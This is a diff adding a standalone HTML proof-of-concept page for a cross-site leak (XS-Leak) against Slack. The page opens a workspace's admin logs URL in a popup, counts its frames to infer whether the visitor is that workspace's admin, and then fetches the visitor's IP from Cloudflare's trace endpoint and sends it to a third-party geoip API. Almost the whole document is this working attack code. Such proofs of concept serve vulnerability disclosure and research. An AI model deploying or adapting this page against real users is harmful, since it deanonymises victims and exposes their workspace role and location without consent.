@@ -1,0 +1,105 @@
+<!doctype html>
+<html>
+<head>
+    <title>POC</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <div class="container pt-3">
+        <h1>
+            XSLEAK - POC - FRAMES LEAK
+        </h1>
+        <div class="form-group">
+            <br />
+            <div class="row">
+                <div class="col-md-10">
+                    <input type="text" placeholder="Enter teamname e.g vision-omega" class="form-control" id="do">
+                </div>
+                <div class="col-md-2">
+                    <button type="button" class="btn btn-success" onclick="checkOwner();">Check</button>
+                </div>
+            </div>
+        </div>
+        <div class="container" >
+            <code id="result">
+            </code>
+            <div class="row" style="margin-top: 1.5em;">
+                <div class="col-md-7">
+                    <code id="whoisinfo">
+
+                    </code>
+                </div>
+                <div class="col-md-5">
+                    <code id="whoisinfo2">
+
+                    </code>
+                </div>
+            </div>
+        </div>
+    </div>
+<script>
+window.blocked = false;
+            window.dataip = null
+            var cloudFlare = "https://www.cloudflare.com/cdn-cgi/trace";
+            var whois = "https://api.hackertarget.com/geoip/?q="
+            var downloadBarSize = 49;
+            var getwhois = (ip) => {
+                fetch(whois+ip).then((resp) => {
+                    return resp.text();
+                }).then((data) => {
+                    document.getElementById("whoisinfo2").innerHTML = "<pre>"+data+"</pre>";
+                });
+            }
+
+            var clear = () => {
+                document.getElementById("whoisinfo").innerHTML = "";
+                document.getElementById("whoisinfo2").innerHTML = "";
+            }
+
+            var getUserInfo = () => {
+                fetch(cloudFlare).then(
+                    (resp) => {
+                        return resp.text();
+                    }
+                ).then((data) => {
+                    document.getElementById("whoisinfo").innerHTML = "<pre>"+data+"</pre>";
+                    window.dataip = data.split("\n")[2].split("=")[1];
+                    getwhois(window.dataip);
+                });
+            }
+            function checkOwner(){
+                var result = document.getElementById("result");
+                var teamname = document.getElementById("do").value;
+                var windowHeight = window.innerHeight;
+
+                
+                if(win == null)
+                    var win = window.open();
+                
+                win.location = "https://"+teamname+".slack.com/apps/manage/logs"
+
+                setTimeout(() => {
+                    
+                        //below condition one is for download bar chrome
+                        if(win.frames.length == 1){
+                            result.innerHTML = "[+] You are the admin of "+teamname+", below are your details";
+                            getUserInfo();
+                            
+                        }else{
+                            result.innerHTML = "[+] Nothing found";
+                            clear();
+                        }
+                    
+                }, 10000);
+                
+            }
+
+</script>
+
+</body>
+
+</html>
